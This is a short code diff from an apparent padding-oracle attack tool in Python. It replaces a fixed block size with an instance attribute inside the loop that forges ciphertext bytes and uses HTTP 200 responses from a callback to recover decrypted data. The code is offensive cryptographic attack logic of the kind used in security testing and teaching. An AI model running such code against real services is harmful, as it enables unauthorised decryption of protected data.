@@ -24,12 +24,11 @@ class PaddingAttack(object):
         intermediate_bytes = []
         decrypted_bytes = []
         pos = 0
-        blocksize = 16
         while pos <= 16:
-            data = "\x00" * (blocksize-pos) + chr(pos) * pos
+            data = "\x00" * (self.blocklen-pos) + chr(pos) * pos
             for i in range(1, 0xff+1):
                 temp = map(chr, intermediate_bytes)
-                data = data[:blocksize-pos] + chr(i) + xord(temp, [chr(pos)]*len(intermediate_bytes))
+                data = data[:self.blocklen-pos] + chr(i) + xord(temp, [chr(pos)]*len(intermediate_bytes))
                 data += self.enc_block
                 return_code = self.callback(data.encode("hex"))
                 if return_code == 200:
